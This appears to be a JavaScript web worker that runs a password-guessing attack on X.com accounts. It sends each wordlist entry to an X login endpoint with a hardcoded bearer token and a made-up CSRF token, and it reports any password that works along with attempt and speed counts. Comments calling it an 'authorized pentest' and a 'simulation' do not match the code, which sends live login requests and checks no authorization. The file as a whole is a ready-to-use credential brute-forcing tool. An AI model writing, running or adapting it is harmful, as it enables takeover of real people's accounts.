self.onmessage = async function(e) {
    const { wordlist, target, username, platform, delay, workerId } = e.data;
    
    let attempts = 0;
    let speed = 0;
    let rateLimitUsed = 0;
    const startTime = Date.now();
    
    async function testXPassword(password) {
        attempts++;
        rateLimitUsed++;
        
        // Rate limit simulation + delay
        await new Promise(resolve => setTimeout(resolve, delay));
        
        try {
            // X.com Login API Simulation (Authorized Pentest)
            const response = await fetch(`https://${target}/i/api/1.1/account/login.json`, {
                method: 'POST',
                headers: {
                    'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-CSRF-Token': 'pentest-csrf-token-' + Date.now()
                },
                body: new URLSearchParams({
                    sessionid: `pentest-${workerId}-${Date.now()}`,
                    username: username,
                    password: password
                }),
                credentials: 'include'
            });
            
            // Success conditions (Authorized Pentest Mode)
            if (response.ok && (response.headers.get('set-cookie') || response.status === 200)) {
                return {
                    success: true,
                    password,
                    response: await response.text()
                };
            }
        } catch(e) {
            // Network/Rate limit handling
        }
        
        return { success: false };
    }
    
    // Test passwords sequentially
    for (let password of wordlist.slice(0, 1000)) { // Limit per worker
        const result = await testXPassword(password);
        if (result.success) {
            self.postMessage({
                result: {
                    target,
                    username,
                    password: result.password,
                    platform,
                    workerId,
                    timestamp: new Date().toISOString()
                },
                attempts,
                speed: Math.floor(attempts / ((Date.now() - startTime) / 1000)),
                rateLimit: rateLimitUsed
            });
            return;
        }
        
        // Periodic updates
        if (attempts % 50 === 0) {
            speed = Math.floor(attempts / ((Date.now() - startTime) / 1000));
            self.postMessage({
                result: null,
                attempts,
                speed,
                rateLimit: rateLimitUsed
            });
        }
    }
    
    self.postMessage({
        result: null,
        attempts,
        speed: Math.floor(attempts / ((Date.now() - startTime) / 1000)),
        rateLimit: rateLimitUsed
    });
};
